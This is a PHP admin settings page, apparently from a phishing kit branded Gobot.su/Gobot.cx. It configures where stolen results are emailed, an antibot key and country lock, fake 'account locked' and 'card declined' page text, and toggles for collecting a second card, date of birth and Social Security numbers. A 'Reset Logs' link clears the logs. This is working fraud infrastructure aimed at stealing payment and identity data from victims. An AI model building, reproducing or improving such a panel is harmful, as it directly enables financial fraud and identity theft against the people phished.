<?php
session_start();

if (!isset($_SESSION['username'])) {
    header('Location: login');
    exit;
}

$configPath = '../helper/config.json';
$config = json_decode(file_get_contents('../helper/config.json'), true);

function isSelected($config, $key, $value) {
    return (isset($config[$key]) && $config[$key] === $value) ? 'selected' : '';
}

$error = '';
$success = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    try {
        foreach ($_POST as $key => $value) {
            if (isset($config[$key])) {
                $config[$key] = $value;
            }
        }

        if (file_put_contents($configPath, json_encode($config, JSON_PRETTY_PRINT))) {
            $success = "✅ Settings have been successfully saved!";
        } else {
            $error = "❌ Failed to save configuration!";
        }
    } catch (Exception $e) {
        $error = "⚠️ An unexpected error occurred: " . $e->getMessage();
    }
}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
	<meta charset="utf-8">
	<title>Gobot.su/Gobot.cx | Settings</title>
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta name="description" content="">
	<meta name="author" content="">
	
	<!-- ================== BEGIN core-css ================== -->
	<link href="assets/css/vendor.min.css" rel="stylesheet">
	<link href="assets/css/app.min.css" rel="stylesheet">
	<!-- ================== END core-css ================== -->
	
</head>
<body>
	<!-- BEGIN #app -->
	<div id="app" class="app">

		<?php

include 'include/nav.php';

?>

<?php

include 'include/sidebar.php';

?>
			
		<!-- BEGIN mobile-sidebar-backdrop -->
		<button class="app-sidebar-mobile-backdrop" data-toggle-target=".app" data-toggle-class="app-sidebar-mobile-toggled"></button>
		<!-- END mobile-sidebar-backdrop -->
		
		<!-- BEGIN #content -->
		<div id="content" class="app-content">
			<!-- BEGIN container -->
			<div class="container">
				<!-- BEGIN row -->
				<div class="row justify-content-center">
					<!-- BEGIN col-10 -->
					<div class="col-xl-10">
						<!-- BEGIN row -->
						<div class="row">
							<!-- BEGIN col-9 -->
							<div class="col-xl-9">
								<!-- BEGIN #general -->
        
            <?php if ($success): ?>
              <div class="alert alert-success"><?= $success ?></div>
            <?php elseif ($error): ?>
              <div class="alert alert-danger"><?= $error ?></div>
            <?php endif; ?>
        
            <form method="post">
								<div id="general" class="mb-5">
									<h4><i class="far fa-user fa-fw text-theme"></i> General</h4>
									<p>View and update your general account information and settings.</p>
									<div class="card">
										<div class="list-group list-group-flush">
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Parameter</div>
													<input type="text" class="form-control" id="parameter" name="parameter" value="<?= $config['parameter'] ?? '' ?>" placeholder="parameter">
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Email Result</div>
													<input type="email" class="form-control" id="result" name="email_result" value="<?= $config['email_result'] ?? '' ?>" placeholder="Your parameter">
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Gobot.su Key</div>
													<input type="text" class="form-control" id="key" name="gobot_key" value="<?= $config['gobot_key'] ?? '' ?>" placeholder="antibotkey">
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>ALLOWED COUNTRIES  (Biarkan jika lock country off):</div>
													<input type="text" class="form-control" id="allowed_countries" name="lock_country"  value="<?= $config['lock_country'] ?? '' ?>" placeholder=" example ( ID,US,DE )">
												</div>
											</div>
										</div>
										<div class="card-arrow">
											<div class="card-arrow-top-left"></div>
											<div class="card-arrow-top-right"></div>
											<div class="card-arrow-bottom-left"></div>
											<div class="card-arrow-bottom-right"></div>
										</div>
									</div>
								</div>
								<!-- END #general -->
								
								<!-- BEGIN #notifications -->
								<div id="notifications" class="mb-5">
									<h4><i class="far fa-bell fa-fw text-theme"></i> Page Text</h4>
									<p>Update your page information and setting.</p>
									<div class="card">
										<div class="list-group list-group-flush">
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Activity Page Title</div>
													<input type="text" class="form-control"  id="allowed_countries" name="activity_page_title" value="<?= $config['activity_page_title'] ?? '' ?>" placeholder="example ( your account locked )">
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Activity Page Content</div>
													<input type="text" class="form-control" id="allowed_countries" name="activity_page_desc" value="<?= $config['activity_page_desc'] ?? '' ?>" placeholder="example ( your text decription page )">
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Billing Page Content</div>
													<input type="text" class="form-control" name="billing_page_desc" placeholder="example ( your decription page )" value="<?= $config['billing_page_desc'] ?? '' ?>">
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center" >
												<div class="flex-1 text-break">
													<div>Card Declined Title </div>
													<input type="text" class="form-control" name="billing_page_title" placeholder="example ( update your billing )" value="<?= $config['billing_page_title'] ?? '' ?>">
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Card Declined Text</div>
													<input type="text" class="form-control" name="billing_page_decline" placeholder="example ( your card declined, please try )" value="<?= $config['billing_page_decline'] ?? '' ?>">
												</div>
											</div>
										</div>
										<div class="card-arrow">
											<div class="card-arrow-top-left"></div>
											<div class="card-arrow-top-right"></div>
											<div class="card-arrow-bottom-left"></div>
											<div class="card-arrow-bottom-right"></div>
										</div>
									</div>
								</div>
								<!-- END #notifications -->
								
								<!-- BEGIN #privacyAndSecurity -->
								<div id="privacyAndSecurity" class="mb-5">
									<h4><i class="far fa-copyright fa-fw text-theme"></i> Privacy and security</h4>
									<p>Limit the account visibility and the security settings for your website.</p>
									<div class="card">
										<div class="list-group list-group-flush">
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Gobot Blocker</div>
													<select class="form-select" id="blockerchildrich" name="gobot_status">
                                                        <option value="on" <?= isSelected($config, 'gobot_status', 'on') ?>>ON</option>
                                                        <option value="off" <?= isSelected($config, 'gobot_status', 'off') ?>>OFF</option>
													</select>
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Lock Country</div>
													<select class="form-select" id="lockcountry" name="lock_country_status">
                                                        <option value="on" <?= isSelected($config, 'lock_country_status', 'on') ?>>ON</option>
                                                        <option value="off" <?= isSelected($config, 'lock_country_status', 'on') ?>>OFF</option>
													</select>
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Double Card</div>
													<select class="form-select" id="doublecard" name="double_card">
                                                        <option value="on" <?= isSelected($config, 'double_card', 'on') ?>>ON</option>
                                                        <option value="off" <?= isSelected($config, 'double_card', 'on') ?>>OFF</option>
													</select>
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>ACTIVITY</div>
													<select class="form-select" id="activity" name="activity_page_status">
                                                        <option value="on" <?= isSelected($config, 'activity_page_status', 'on') ?>>ON</option>
                                                        <option value="off" <?= isSelected($config, 'activity_page_status', 'on') ?>>OFF</option>
													</select>
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>DOB</div>
													<select class="form-select" name="dob">
													    <option value="on" <?= isSelected($config, 'dob', 'on') ?>>ON</option>
													    <option value="off" <?= isSelected($config, 'dob', 'on') ?>>OFF</option>
													</select>
												</div>
											</div>
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>SSN</div>
													<select class="form-select" name="ssn">
													    <option value="on" <?= isSelected($config, 'ssn', 'on') ?>>ON</option>
													    <option value="off" <?= isSelected($config, 'ssn', 'on') ?>>OFF</option>
													</select>
												</div>
											</div>
										</div>
									</div>
								</div>
								
                <button type="submit" class="btn btn-outline-success w-100px">Save Settings</button>
            </form>
            <br>
								<!-- END #privacyAndSecurity -->
								
								<!-- BEGIN #resetSettings -->
								<div id="resetSettings" class="mb-5">
									<h4><i class="fa fa-redo fa-fw text-theme"></i> Reset Logs</h4>
									<p>Clear all logs.</p>
									<div class="card">
										<div class="list-group list-group-flush">
											<div class="list-group-item d-flex align-items-center">
												<div class="flex-1 text-break">
													<div>Reset Logs</div>
													<div class="text-inverse text-opacity-50">
														This action will clear and reset all the current Logs Site.
													</div>
												</div>
												<div>
													<a href="../logs/index?path=clear" class="btn btn-outline-default w-100px">Reset</a>
												</div>
											</div>
										</div>
										<div class="card-arrow">
											<div class="card-arrow-top-left"></div>
											<div class="card-arrow-top-right"></div>
											<div class="card-arrow-bottom-left"></div>
											<div class="card-arrow-bottom-right"></div>
										</div>
									</div>
								</div>
								<!-- END #resetSettings -->
							</div>
							<!-- END col-9-->
							<!-- BEGIN col-3 -->
							<div class="col-xl-3">
								<!-- BEGIN #sidebar-bootstrap -->
								<nav id="sidebar-bootstrap" class="navbar navbar-sticky d-none d-xl-block">
									<nav class="nav">
										<a class="nav-link" href="#general" data-toggle="scroll-to">General</a>
										<a class="nav-link" href="#notifications" data-toggle="scroll-to">Notifications</a>
										<a class="nav-link" href="#privacyAndSecurity" data-toggle="scroll-to">Privacy and security</a>
										<a class="nav-link" href="#payment" data-toggle="scroll-to">Payment</a>
										<a class="nav-link" href="#shipping" data-toggle="scroll-to">Shipping</a>
										<a class="nav-link" href="#mediaAndFiles" data-toggle="scroll-to">Media and Files</a>
										<a class="nav-link" href="#languages" data-toggle="scroll-to">Languages</a>
										<a class="nav-link" href="#system" data-toggle="scroll-to">System</a>
										<a class="nav-link" href="#resetSettings" data-toggle="scroll-to">Reset settings</a>
									</nav>
								</nav>
								<!-- END #sidebar-bootstrap -->
							</div>
							<!-- END col-3 -->
						</div>
						<!-- END row -->
					</div>
					<!-- END col-10 -->
				</div>
				<!-- END row -->
			</div>
			<!-- END container -->
		</div>
		<!-- END #content -->
		
		<!-- BEGIN #modalEdit -->
		<div class="modal fade" id="modalEdit">
			<div class="modal-dialog">
				<div class="modal-content">
					<div class="modal-header">
						<h5 class="modal-title">Edit name</h5>
						<button type="button" class="btn-close" data-bs-dismiss="modal"></button>
					</div>
					<div class="modal-body">
						<div class="mb-3">
							<label class="form-label">Name</label>
							<div class="row row-space-10">
								<div class="col-4">
									<input class="form-control" placeholder="First" value="Sean">
								</div>
								<div class="col-4">
									<input class="form-control" placeholder="Middle" value="">
								</div>
								<div class="col-4">
									<input class="form-control" placeholder="Last" value="Ngu">
								</div>
							</div>
						</div>
						<div class="alert bg-inverse bg-opacity-10 border-0">
							<b>Please note:</b> 
							If you change your name, you can't change it again for 60 days. 
							Don't add any unusual capitalization, punctuation, characters or random words. 
							<a href="#" class="alert-link">Learn more.</a>
						</div>
						<div class="mb-3">
							<label class="form-label">Other Names</label>
							<div>
								<a href="#" class="btn btn-outline-default"><i class="fa fa-plus fa-fw"></i> Add other names</a>
							</div>
						</div>
					</div>
					<div class="modal-footer">
						<button type="button" class="btn btn-outline-default" data-bs-dismiss="modal">Close</button>
						<button type="button" class="btn btn-outline-theme">Save changes</button>
					</div>
				</div>
			</div>
		</div>
		<!-- END #modalEdit -->
		
		<!-- BEGIN theme-panel -->
		<?php

include 'include/footer.php';

?>


?>
</body>
</html>
